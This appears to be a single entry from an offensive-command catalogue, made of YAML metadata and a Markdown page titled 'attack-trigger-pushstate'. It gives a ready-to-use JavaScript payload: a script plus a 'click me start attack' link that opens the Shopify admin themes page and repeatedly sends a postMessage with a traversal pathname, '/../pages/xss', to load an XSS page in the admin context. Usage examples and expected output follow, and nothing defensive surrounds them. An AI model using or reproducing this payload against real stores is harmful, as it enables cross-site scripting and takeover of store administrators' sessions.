---
id: cmd-002
data: >-
  <script>function attack(){const ctx =
  window.open(location.origin+'/admin/themes','_blank')const data
  =JSON.stringify({message:'Shopify.API.pushState',data:{pathname:"/../pages/xss"}});let
  interval; interval
  =setInterval(function(){if(window.attackSuccess){clearInterval(interval)}else{
  ctx.postMessage(data)}},500)}attack()</script><a href="javascript:attack()"
  style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click
  me start attack</a>
tags:
  - path-traversal
  - postmessage
type: command
output: 'Triggers route change in admin, loads XSS page'
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:18.374Z'
verified: false
validated: true
submitted: true
---
# attack-trigger-pushstate

## Command

```javascript
function attack(){
  const ctx = window.open(location.origin+'/admin/themes','_blank')
  const data =JSON.stringify({message:'Shopify.API.pushState',data:{pathname:"/../pages/xss"}});
  let interval; 
  interval =setInterval(function(){
    if(window.attackSuccess){clearInterval(interval)}
    else{ ctx.postMessage(data)}
  },500)
}
attack()
```

## Description

Script that opens admin themes tab and sends JSON postMessage for pushState with traversal pathname, retrying every 500ms until success flag.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| pathname | "/../pages/xss" for traversal | Yes |
| postMessage | Sends to target window | Yes |
| setInterval | 500ms retry delay | Yes |

## Examples

### Basic Usage

```javascript
const data =JSON.stringify({message:'Shopify.API.pushState',data:{pathname:"/../pages/xss"}});
ctx.postMessage(data)
```

### Advanced Usage

```javascript
setInterval(() => ctx.postMessage(data), 500)
```

## Expected Output

Admin route pushes to load /pages/xss; success when attackSuccess flag sets.

## Related

- [[Related Procedure: Create-Attack-Trigger-Page]]
